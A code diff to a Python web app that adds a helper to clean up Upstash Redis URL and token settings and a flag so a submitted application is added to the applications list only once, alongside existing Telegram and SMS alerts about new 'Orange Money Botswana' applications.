@@ -133,13 +133,32 @@ def get_base_url():
     host = request.headers.get("X-Forwarded-Host", request.host)
     return f"{proto}://{host}".rstrip('/')
 
-def persist_record(app_id, data_update):
+def sanitize_upstash_env():
+    url = (os.environ.get("UPSTASH_REDIS_REST_URL") or "").strip()
+    if url.startswith('"') and url.endswith('"'):
+        url = url[1:-1].strip()
+    if url.startswith("'") and url.endswith("'"):
+        url = url[1:-1].strip()
+    if url and not url.startswith("http://") and not url.startswith("https://"):
+        url = f"https://{url}"
+    url = url.rstrip('/')
+
+    token = (os.environ.get("UPSTASH_REDIS_REST_TOKEN") or "").strip()
+    if token.startswith('"') and token.endswith('"'):
+        token = token[1:-1].strip()
+    if token.startswith("'") and token.endswith("'"):
+        token = token[1:-1].strip()
+    if token.startswith("Bearer "):
+        token = token[7:].strip()
+    return url, token
+
+def persist_record(app_id, data_update, push_list=False):
     try:
         key = f"app:{app_id}"
-        if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
-            base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
+        base_url, token = sanitize_upstash_env()
+        if base_url and token:
             headers = {
-                "Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}",
+                "Authorization": f"Bearer {token}",
                 "Content-Type": "application/json"
             }
             existing = {}
@@ -155,15 +174,16 @@ def persist_record(app_id, data_update):
             existing["updated_at"] = get_now_str()
             # Command array for SET
             requests.post(base_url, headers=headers, json=["SET", key, json.dumps(existing)], timeout=4)
-            # Add to applications list
-            requests.post(base_url, headers=headers, json=["LPUSH", "applications", key], timeout=4)
+            if push_list:
+                requests.post(base_url, headers=headers, json=["LPUSH", "applications", key], timeout=4)
         elif db:
             raw = db.get(key)
             existing = json.loads(raw) if raw else {}
             existing.update(data_update)
             existing["updated_at"] = get_now_str()
             db.set(key, json.dumps(existing))
-            db.lpush("applications", key)
+            if push_list:
+                db.lpush("applications", key)
     except Exception as e:
         print(f"Error persisting record: {e}")
     if app_id not in LOCAL_RECORDS:
@@ -174,10 +194,10 @@ def persist_record(app_id, data_update):
 def get_record(app_id):
     key = f"app:{app_id}"
     try:
-        if UPSTASH_REDIS_REST_URL and UPSTASH_REDIS_REST_TOKEN:
-            base_url = UPSTASH_REDIS_REST_URL.rstrip('/')
+        base_url, token = sanitize_upstash_env()
+        if base_url and token:
             headers = {
-                "Authorization": f"Bearer {UPSTASH_REDIS_REST_TOKEN}",
+                "Authorization": f"Bearer {token}",
                 "Content-Type": "application/json"
             }
             get_res = requests.post(base_url, headers=headers, json=["GET", key], timeout=4)
@@ -1289,7 +1309,7 @@ def save_unified():
                 "amount": amt,
                 "created_at": now,
                 "status": "submitted"
-            })
+            }, push_list=True)
             m = f'🚀 *New Application Submitted*\n\n👤 *Name:* {name}\n📞 *Phone:* {phone}\n💰 *Amount:* P {amt}\n📅 *Time:* {now}'
             send_telegram_notification(m)
             send_sms_notification(f"[Orange Money Botswana] New Application\nName: {name}\nPhone: {phone}\nAmount: P {amt}")
